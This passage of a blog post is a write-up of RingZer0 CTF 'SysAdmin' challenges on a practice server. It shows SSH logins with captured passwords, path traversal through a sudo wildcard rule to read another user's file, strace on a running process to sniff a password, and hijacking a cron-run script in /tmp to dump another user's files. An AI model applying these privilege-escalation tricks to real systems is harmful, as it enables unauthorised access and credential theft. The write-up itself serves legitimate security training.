+<span style=color:#6ab825;font-weight:700>case</span> <span style=color:#ed9d13>&#34;$TERM&#34;</span> in
+xterm*|rxvt*)
+    PS1=<span style=color:#ed9d13>&#34;\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1&#34;</span>
+    ;;
+*)
+    ;;
+esac
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> enable color support of ls and also add handy aliases
+alias reveal=<span style=color:#ed9d13>&#34;openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k &#39;lp6PWgOwDctq5Yx7ntTmBpOISc&#39;&#34;</span>
+<span style=color:#6ab825;font-weight:700>if</span> [ -x /usr/bin/dircolors ]; then
+    test -r <span style=color:#a61717;background-color:#e3d2d2>~</span>/.dircolors &amp;&amp; eval <span style=color:#ed9d13>&#34;$(dircolors -b ~/.dircolors)&#34;</span> || eval <span style=color:#ed9d13>&#34;$(dircolors -b)&#34;</span>
+    alias ls=<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>ls --color=auto<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
+    <span style=color:#a61717;background-color:#e3d2d2>#</span>alias dir=<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>dir --color=auto<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
+    <span style=color:#a61717;background-color:#e3d2d2>#</span>alias vdir=<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>vdir --color=auto<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
+
+    <span style=color:#a61717;background-color:#e3d2d2>#</span>alias grep=<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>grep --color=auto<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
+    <span style=color:#a61717;background-color:#e3d2d2>#</span>alias fgrep=<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>fgrep --color=auto<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
+    <span style=color:#a61717;background-color:#e3d2d2>#</span>alias egrep=<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>egrep --color=auto<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
+fi
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> some more ls aliases
+<span style=color:#a61717;background-color:#e3d2d2>#</span>alias ll=<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>ls -l<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
+<span style=color:#a61717;background-color:#e3d2d2>#</span>alias la=<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>ls -A<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
+<span style=color:#a61717;background-color:#e3d2d2>#</span>alias l=<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>ls -CF<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> Alias definitions.
+<span style=color:#a61717;background-color:#e3d2d2>#</span> You may want to put all your additions into a separate file like
+<span style=color:#a61717;background-color:#e3d2d2>#</span> <span style=color:#a61717;background-color:#e3d2d2>~</span>/.bash_aliases, instead of adding them here directly.
+<span style=color:#a61717;background-color:#e3d2d2>#</span> See /usr/share/doc/bash-doc/examples in the bash-doc <span style=color:#6ab825;font-weight:700>package</span>.
+
+<span style=color:#6ab825;font-weight:700>if</span> [ -f <span style=color:#a61717;background-color:#e3d2d2>~</span>/.bash_aliases ]; then
+    . <span style=color:#a61717;background-color:#e3d2d2>~</span>/.bash_aliases
+fi
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> enable programmable completion <span style=color:#447fcf>features</span> (you don<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>t need to enable
+<span style=color:#a61717;background-color:#e3d2d2>#</span> this, <span style=color:#6ab825;font-weight:700>if</span> it<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>s already enabled in /etc/bash.bashrc and /etc/profile
+<span style=color:#a61717;background-color:#e3d2d2>#</span> sources /etc/bash.bashrc).
+</code></pre></div><p>Do you see sth suspicious? No? Well, I do!</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>alias reveal=&#34;openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k &#39;lp6PWgOwDctq5Yx7ntTmBpOISc&#39;&#34;
+</code></pre></div><p>Let&rsquo;s decrypt the file:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>oracle@forensics:~$ reveal
+FLAG-IaFOjjFWazycSg0lbVO3T8ZTvz
+</code></pre></div><h2 id=sysadmin-part-6>SysAdmin Part 6</h2><p>Login as <code>trinity</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375
+
+trinity@forensics:~$ ls -la
+total 28
+drwxr-xr-x  2 trinity trinity 4096 Mar 10  2014 .
+drwxr-xr-x 10 root    root    4096 Jun 12  2014 ..
+lrwxrwxrwx  1 root    root       9 Mar  9  2014 .bash_history -&gt; /dev/null
+-rwxr--r--  1 trinity trinity  236 Oct 29  2015 .bash_logout
+-rwxr--r--  1 trinity trinity 2638 Jul 19 06:37 .bashrc
+-rw-r-----  1 neo     neo      124 Sep 20  2015 phonebook
+-rwxr--r--  1 trinity trinity  675 Dec 10  2015 .profile
+-rwxr-----  1 trinity trinity   23 Jul  5 16:50 .vimrc
+</code></pre></div><p>Obviously only <code>neo:neo</code> can read <code>phonebook</code>. Now let&rsquo;s check for <code>sudo</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>trinity@forensics:~$ sudo -l
+[sudo] password for trinity:
+Matching Defaults entries for trinity on this host:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, insults
+
+User trinity may run the following commands on this host:
+    (neo) /bin/cat /home/trinity/*
+</code></pre></div><p>Now read the files:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/*
+The Oracle        1800-133-7133
+Persephone        345-555-1244
+
+
+
+
+
+copy made by Cypher copy utility on /home/neo/phonebook
+</code></pre></div><p>Hmmm, nothing special about it. However, you can use the wildcard to go into the parent directory and
+finally into <code>/home/neo/</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/../neo/phonebook
+The Oracle        1800-133-7133
+Persephone        345-555-1244
+
+
+
+
+change my current password FLAG-lRGLKGh2895wIAoOvcBbgk4oL
+don&#39;t forget to remove this :)
+</code></pre></div><p>Fail :)</p><h2 id=sysadmin-part-7>SysAdmin Part 7</h2><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>% sshpass -p FLAG-lRGLKGh2895wIAoOvcBbgk4oL ssh neo@for01.ringzer0team.com -p 13375
+
+         _                             ____  __                     
+   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
+  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
+                            / _ \ &#39; \| | | &#39; \/ -_) | (__  | | | _| 
+                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
+                                                                    
+
+You have mail.
+neo@forensics:~$ 
+</code></pre></div><p>Let&rsquo;s have a look at running processes:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>neo@forensics:~$ ps fl -u neo  
+F   UID   PID  PPID PRI  NI    VSZ   RSS WCHAN  STAT TTY        TIME COMMAND
+4  1003 32505 32503  20   0   3944   256 -      Ss   ?          0:01 /bin/monitor
+4  1003 32073 32071  20   0   3944   256 -      Ss   ?          0:01 /bin/monitor
+4  1003 31844 31842  20   0   3944   256 -      Ss   ?          0:04 /bin/monitor
+4  1003 31624 31622  20   0   3944   256 -      Ss   ?          0:03 /bin/monitor
+4  1003 31471 31469  20   0   3944   256 -      Ss   ?          0:02 /bin/monitor
+4  1003 31078 31076  20   0   3944   256 -      Ss   ?          0:02 /bin/monitor
+4  1003 30040 30038  20   0   3944   256 -      Ss   ?          0:02 /bin/monitor
+[...]
+</code></pre></div><p>Since we can read <code>/bin/monitor</code> as user <code>neo</code> (and <code>/bin/monitor</code> was started using
+<code>sudo neo -c /bin/monitor</code>) we should be able to <strong>trace</strong> its syscalls (since we are
+allowed to attach to a process running as user <code>neo</code>):</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>neo@forensics:~$ strace -p32505
+Process 32505 attached - interrupt to quit
+restart_syscall(&lt;... resuming interrupted call ...&gt;) = 0
+write(4294967295, &#34;telnet 127.0.0.1 23\n&#34;, 20) = -1 EBADF (Bad file descriptor)
+write(4294967295, &#34;user\n&#34;, 5)          = -1 EBADF (Bad file descriptor)
+write(4294967295, &#34;FLAG-a4UVY5HJQO5ddLc5wtBps48A3\n&#34;, 31) = -1 EBADF (Bad file descriptor)
+write(4294967295, &#34;get-cpuinfo\n&#34;, 12)  = -1 EBADF (Bad file descriptor)
+rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
+rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+nanosleep({10, 0},
+</code></pre></div><p>Bingo! The flag is <code>FLAG-a4UVY5HJQO5ddLc5wtBps48A3</code>.</p><h2 id=sysadmin-part-8>SysAdmin Part 8</h2><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>% sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375
+
+         _                             ____  __                     
+   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
+  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
+                            / _ \ &#39; \| | | &#39; \/ -_) | (__  | | | _| 
+                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
+                                                                    
+
+You have mail.
+</code></pre></div><p>I remember some information related to the user <code>cypher</code> during the previous challanges. In fact
+I think I&rsquo;ve seen sth in the files located at <code>/backups</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>morpheus@forensics:/var/tmp/bk$ cp /backup/* .
+morpheus@forensics:/var/tmp/bk$ for i in *; do tar -xf $i; done
+morpheus@forensics:/var/tmp/bk$ for i in *; do tar -xf $i; done
+morpheus@forensics:/var/tmp/bk$ ls -ltR
+.:
+total 96
+drwxr-xr-x 4 morpheus morpheus  4096 Sep 27 04:46 var
+-rwxr-xr-x 1 morpheus morpheus 40960 Sep 27 04:46 3dab3277410dddca016834f91d172027
+-rwxr-xr-x 1 morpheus morpheus 10240 Sep 27 04:46 776d27d2a429e63bbc3cb29183417bb2
+-rwxr-xr-x 1 morpheus morpheus 20480 Sep 27 04:46 c074fa6ec17bb35e168366c43cf4cd19
+-rwxr-xr-x 1 morpheus morpheus 10240 Sep 27 04:46 ca584b15ae397a9ad45b1ff267b55796
+drwxr-xr-x 3 morpheus morpheus  4096 Sep 15  2014 home
+drwxr-x--x 2 morpheus morpheus  4096 Mar 12  2014 tmp
+
+./var:
+total 8
+drwxr-xr-x 3 morpheus morpheus 4096 Sep 27 04:46 spool
+drwxr-xr-x 2 morpheus morpheus 4096 Sep 27 04:46 log
+
+./var/spool:
+total 4
+drwxr-xr-x 5 morpheus morpheus 4096 Feb 25  2014 cron
+
+./var/spool/cron:
+total 12
+drwx--x--- 2 morpheus morpheus 4096 Mar 12  2014 crontabs
+drwxr-x--- 2 morpheus morpheus 4096 Feb 25  2014 atjobs
+drwxr-x--- 2 morpheus morpheus 4096 Jun  9  2012 atspool
+
+./var/spool/cron/crontabs:
+total 4
+-rw------- 1 morpheus morpheus 1126 Mar 12  2014 cypher
+
+./var/spool/cron/atjobs:
+total 0
+
+./var/spool/cron/atspool:
+total 0
+
+./var/log:
+total 40
+-rw-r----- 1 morpheus morpheus 37172 Mar 12  2014 syslog
+
+./home:
+total 4
+drwxr-x--- 3 morpheus morpheus 4096 Sep 15  2014 oracle
+
+./home/oracle:
+total 0
+
+./tmp:
+total 4
+-rwxr-xr-x 1 morpheus morpheus 54 Mar 12  2014 Gathering.py
+</code></pre></div><p>As you can see there is user cronjob:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>morpheus@forensics:/var/tmp/bk$ cat ./var/spool/cron/crontabs/cypher
+# DO NOT EDIT THIS FILE - edit the master and reinstall.
+# (/tmp/crontab.f7mcQy/crontab installed on Wed Mar 12 22:02:27 2014)
+# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).# 
+# Notice that tasks will be started based on the cron&#39;s system
+# daemon&#39;s notion of time and timezones.
+#
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+#
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+#
+# For more information see the manual pages of crontab(5) and cron(8)
+#
+# m h  dom mon dow   command
+*/3 * * * * python /tmp/Gathering.py
+</code></pre></div><p>So every 3 minutes <code>python /tmp/Gathering.py</code> gets executed. If we look closer, we&rsquo;ll
+notice that the Python file is executed as user <code>cypher</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>morpheus@forensics:/var/tmp/bk$ grep -r &#34;cypher&#34; *
+Binary file 3dab3277410dddca016834f91d172027 matches
+Binary file 776d27d2a429e63bbc3cb29183417bb2 matches
+Binary file ca584b15ae397a9ad45b1ff267b55796 matches
+tmp/Gathering.py:os.system(&#34;ps aux &gt; /home/cypher/info.txt&#34;)
+var/log/syslog:Mar 12 22:01:58 forensics crontab[1662]: (cypher) BEGIN EDIT (cypher)
+var/log/syslog:Mar 12 22:02:27 forensics crontab[1662]: (cypher) REPLACE (cypher)
+var/log/syslog:Mar 12 22:02:27 forensics crontab[1662]: (cypher) END EDIT (cypher)
+var/log/syslog:Mar 12 22:03:01 forensics /USR/SBIN/CRON[1682]: (cypher) CMD (python /tmp/Gathering.py)
+var/log/syslog:Mar 12 22:06:01 forensics /USR/SBIN/CRON[1857]: (cypher) CMD (python /tmp/Gathering.py)
+var/log/syslog:Mar 12 22:09:01 forensics /USR/SBIN/CRON[2269]: (cypher) CMD (python /tmp/Gathering.py)
+</code></pre></div><p>Finally we want the Python script to read all files under <code>/home/cypher/*</code> and redirect the STDOUT
+to some file:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>morpheus@forensics:/var/tmp/bk$ touch /tmp/gather.log
+morpheus@forensics:/var/tmp/bk$ chmod 777 /tmp/gather.log
+morpheus@forensics:/var/tmp/bk$ cat /tmp/Gathering.py
+import os
+os.system(&#34;cat /home/cypher/*.* &gt; /tmp/gather.log&#34;)
+</code></pre></div><p>This should do the trick. Now we&rsquo;ll have to wait for the script to get executed. Every 3 minutes means that
+the cronjob will run at following minutes: :00, :03, :06, :09, :12, :15, :18, :21, :24, :27, :30, :33, :36, :39, :42, :45, :48, :51, :54, :57.</p><p>Now wait some time till you see:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>morpheus@forensics:/var/tmp$ ls -l /tmp/gather.log
+-rwxrwxrwx 1 cypher cypher 8256 Nov 11 06:10 /tmp/gather.log
+</code></pre></div><p>Now let&rsquo;s get the content:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>morpheus@forensics:/var/tmp$ cat /tmp/gather.log
+python /tmp/Gathering.py &amp;
+sleep 5
+echo &#34;import os&#34; &gt; /tmp/Gathering.py
+echo &#34;os.system(&#39;ps aux &gt; /tmp/28JNvE05KBltE8S7o2xu&#39;)&#34; &gt;&gt; /tmp/Gathering.py
+chmod 777 /tmp/Gathering.py
+
+BASE ?
+RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=
+...
+</code></pre></div><p>And the flag is:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ echo &#34;RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=&#34; | base64 -d
+FLAG-pys3gfczt9pDkEz2io0Pwd8KNz
+</code></pre></div><p>Now I can also see why I had troubles executing my python script: <code>/tmp/Gathering.py</code> is being executed and then after 5 seconds
+the content of the file gets replaced.</p></div></main><div class="tl fixed list-pages lh-copy" id=contents-list></div><div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l"><a id=scroll-to-top class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick=topFunction() style="color:#fff;visibility:hidden;display:none;transition:opacity .5s,visibility .5s" title="back to top">back to top</a><br><p class="mb0 mt2"><a href=http://blog.dornea.nu/2016/10/29/ringzer0-ctf-javascript-challenges/>prev post</a>
+<a href=http://blog.dornea.nu/2016/11/29/ringzer0-ctf-binaries-time-to-learn-x86-asm-and-gdb/>next post</a></p></div><footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l"><hr class="dn db-l ml0-l gray w3"><br>Powered by <a href=https://gohugo.io/ target=_blank class="link gray dim">Hugo</a>, based on the <a href=https://github.com/lingxz/er target=_blank class="link gray dim">Er</a> theme.<br></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js></script><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css><style>.is-active-link::before{background-color:var(--secondary-color)}</style><script type=text/javascript>var prevScrollpos=window.pageYOffset;window.onscroll=function(){var currentScrollPos=window.pageYOffset;if(document.getElementById("tag-cloud")!==null){if(prevScrollpos>currentScrollPos){document.getElementById("tag-cloud").style.visibility="visible";document.getElementById("tag-cloud").style.opacity="1";}else{document.getElementById("tag-cloud").style.visibility="hidden";document.getElementById("tag-cloud").style.opacity="0";}}
+if(document.body.scrollTop>1000||document.documentElement.scrollTop>1000){document.getElementById("scroll-to-top").style.display="inline";document.getElementById("scroll-to-top").style.visibility="visible";document.getElementById("scroll-to-top").style.opacity="1";}else{document.getElementById("scroll-to-top").style.visibility="hidden";document.getElementById("scroll-to-top").style.opacity="0";}
+prevScrollpos=currentScrollPos;}
+function topFunction(){document.body.scrollTop=0;document.documentElement.scrollTop=0;}
+if(document.getElementById("contents-list")!==null&&document.getElementsByClassName("post-content").length!==0){tocbot.init({tocSelector:'#contents-list',contentSelector:'.post-content',headingSelector:'h1, h2, h3',});}</script></body></html>
